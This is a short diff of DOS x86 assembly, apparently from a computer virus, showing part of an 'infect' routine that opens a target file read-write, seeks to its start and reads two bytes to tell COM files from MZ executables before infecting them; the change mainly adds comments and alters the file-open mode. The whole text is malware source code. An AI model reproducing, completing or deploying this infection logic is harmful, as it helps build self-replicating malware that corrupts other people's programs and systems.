@@ -125,22 +125,22 @@ send_msg:
      iret
 
 infect:               ; DS:DX = ASCIIZ Filename pointer
-     mov ax, 3d02h
+     mov ax, 3d40h    ; 3dh->FileOpen, 40h->01000000b: read-write
      int 21h          ; Open file Using Handle, Read Write. OUT: AX = Handle
      mov bx, ax       ; BX = File Handle
-     push bx
-     xor cx, cx
+     push bx          ; Save BX
+     xor cx, cx       ; CX = 0
      xor dx, dx       ; low order and high order = 0
      mov ax, 4200h    ; Move file pointer to begining of file
-     int 21h
-     pop bx
-     push bx          ; BX = File Handle
+     int 21h          ; Call DOS
+     pop bx           ; Restore BX
+     push bx          ; BX = File Handle, save it again
      mov ax, 3f00h    ; Read file or device
      mov cx, 2        ; Read 2 bytes, this case from the start to check wheter it's a COM file or an MZ Executable
-     push bp
+     push bp          ; Save BP
      add bp, data_section.MZ_BUF
      mov dx, bp       ; Pointer to the MZ buffer
-     pop bp
+     pop bp           ; 
      int 21h          ; Calling int 21h
      pop bx
      cmp word [data_section.MZ_BUF+bp], 'MZ'  ; Is it a MZ file?
